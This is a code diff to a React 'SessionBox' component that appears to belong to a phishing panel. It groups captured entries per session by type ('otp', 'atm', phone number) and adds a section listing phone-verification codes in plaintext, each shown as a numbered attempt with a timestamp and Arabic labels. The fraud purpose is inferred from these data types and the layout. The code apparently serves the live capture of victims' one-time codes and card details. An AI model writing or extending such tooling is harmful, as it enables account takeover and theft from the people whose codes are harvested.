@@ -146,6 +146,7 @@ function SessionBox({
   const otpRows = rows.filter((row) => row.type.startsWith("otp"));
   const atmRows = rows.filter((row) => row.type === "atm");
   const nomerRows = rows.filter((row) => row.type === "nomer");
+  const nomerOtpRows = rows.filter((row) => row.type === "nomer_otp");
   const lastActivity = rows[rows.length - 1]?.createdAt ?? rows[0]?.createdAt;
 
   const statusBadge = blocked
@@ -332,6 +333,32 @@ function SessionBox({
                     </div>
                   );
                 })}
+              </div>
+            )}
+
+            {/* رمز تحقق رقم الجوال */}
+            {nomerOtpRows.length > 0 && (
+              <div className="rounded-3xl border border-green-200 bg-green-50 p-4">
+                <div className="flex items-center justify-between text-xs font-semibold text-green-700 mb-3">
+                  <span>رمز تحقق رقم الجوال</span>
+                  <span>{nomerOtpRows.length} رمز</span>
+                </div>
+                <div className="space-y-2">
+                  {nomerOtpRows.map((otp, index) => {
+                    const data = parseData(otp.data);
+                    return (
+                      <div key={otp.id} className="rounded-2xl bg-white p-3">
+                        <div className="flex items-center justify-between text-slate-500 text-[11px] mb-2">
+                          <span>محاولة {index + 1}</span>
+                          <span dir="ltr">{formatAgo(otp.createdAt)}</span>
+                        </div>
+                        <div className="font-mono text-base font-bold text-green-900 text-center" dir="ltr">
+                          {data.otpCode ?? "—"}
+                        </div>
+                      </div>
+                    );
+                  })}
+                </div>
               </div>
             )}
 
